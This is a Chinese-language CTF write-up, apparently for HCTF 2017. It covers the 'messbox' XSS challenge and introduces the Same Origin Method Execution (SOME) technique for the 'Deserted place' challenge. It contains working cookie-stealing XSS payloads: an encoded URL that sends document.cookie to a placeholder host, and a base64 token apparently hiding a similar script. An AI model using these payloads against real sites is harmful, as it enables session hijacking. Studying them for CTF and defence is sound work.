    exp
    http://auth.2017.hctf.io/login.php?n_url=%3E%3C%2fscript%3E%3Cscript%20src%3D%22http%3A%2f%2fauth.2017.hctf.io%2fgetmessage.php%3Fcallback%3Dwindow.location.href%3D%27http%3A%2f%2fxxx%3Fcookie%3D%27%252bdocument.cookie%3B%2f%2f%22%3E%3C%2fscript%3E
###### 非预期解法
除了上面的漏洞以外，messbox也有漏洞，username在首页没有经过任何过滤就显示在了页面内。
但username这里漏洞会有一些问题，因为本身预期的漏洞点并不是这里，所以这里的username经过我框架本身的一点儿过滤，而且长度有限制，所以从这里利用的人会遇到很多非预期的问题。
payload如下，注册名为
的用户名，并获取token。
传递
    http://messbox.2017.hctf.io/?token=NDYyMGZlMTNhNWM3YTAxY3xQSE5qY21sd2RDQnpjb
    U05THk5aGRYUm9Makl3TVRjdWFHTjBaaTVwYnk5blpYUnRaWE56WVdkbExuQm9jRDlqWVd4c1ltR
    mphejFzYjJOaGRHbHZiajBsTWpkb2RIUndPaTh2Y205dmRHc3VjSGN2SlRJM0pUSmlZblJ2WVNoa
    2IyTjFiV1Z1ZEM1amIyOXJhV1VwT3k4dlBqd3ZjMk55YVhCMFBnPT0=
即可
#### Deserted place
出题思路来自于一个比较特别的叫做SOME的攻击方式，全名`Same Origin Method
Execution`，这是一种2015年被人提出来的攻击方式，可以用来执行同源环境下的任意方法，2年前就有人做了分析。
  * [原paper](http://files.benhayak.com/Same_Origin_Method_Execution__paper.pdf)
  * 
  * 
题目源码如下 
我们一起来研究一下
##### SOME？
首先我们一起来探究一个SOME是什么？
SOMe,Same Origin Method Execution,这是Ben Hayak 在 Black Hat Eorope 2014
演讲的题目。在随后的15年，公开了SOME相关的完整paper，其中讲述了和SOME相关的各种场景和利用思路。有兴趣的朋友可以去看看视频.
我们都知道jsonp是用来解决跨域处理数据问题的解决方案，但是也许会有这样一种情况出现，某个网站的某个富文本编辑器支持选择字体颜色，当你点击按钮的时候，会弹出类似于颜色点选器的轮盘网页，当你选择某一颜色时，这个颜色就会修改原页面的字体页面，这个接口或许是这样实现的。
    http://a.com/color.php?callback=get_color
color.php的代码是这样的
当访问color.php的时候，页面就会自动执行`get_color`，这个页面和父页面同源，结构也和传统的jsonp接口不太一样，但这种情况完全有可能发生。
一般来说，我们可能会尝试在`get_color`尝试domxss，遗憾的是，大部分这样的接口都只允许`.\w+`的字符输入。
而SOME攻击，就是在这种场景下出现的，在callback这里的缺陷可以导致执行同源下的 **任意**
方法，值得注意的是，这种攻击方法并不是csrf，他可以完全模拟你的任何行为。
这种攻击方式有几个局限性: 1、受到返回头的影响，如果返回头为`Content-T ype: application/json`,则任何利用都不会生效。
2、攻击者没办法操作执行函数传入参数，或者可以说是比较难操作。 3、受到同源策略的限制，只能执行同源下的任意方法。
###### 让我们来测试一下
首先我们需要一个站点来模拟一下
index.html
        Secret Button
jsonp.php
getflag!
* * *